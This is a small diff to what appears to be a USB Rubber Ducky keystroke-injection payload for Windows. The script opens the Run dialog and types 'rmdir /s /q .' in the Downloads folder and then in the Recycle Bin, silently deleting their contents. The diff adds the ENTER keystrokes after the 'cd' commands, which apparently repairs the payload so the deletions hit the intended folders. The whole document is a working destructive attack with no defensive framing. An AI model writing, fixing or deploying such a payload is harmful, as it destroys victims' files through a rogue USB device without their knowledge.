@@ -10,11 +10,13 @@ REM ----------------------------------------------------------------------------
 GUI r
 DELAY 250
 STRING cd Downloads
+ENTER
 DELAY 1
 STRING rmdir /s /q .
 ENTER
 DELAY 125
 STRING cd C:\$Recycle.bin
+ENTER
 DELAY 25
 STRING rmdir /s /q .
 ENTER
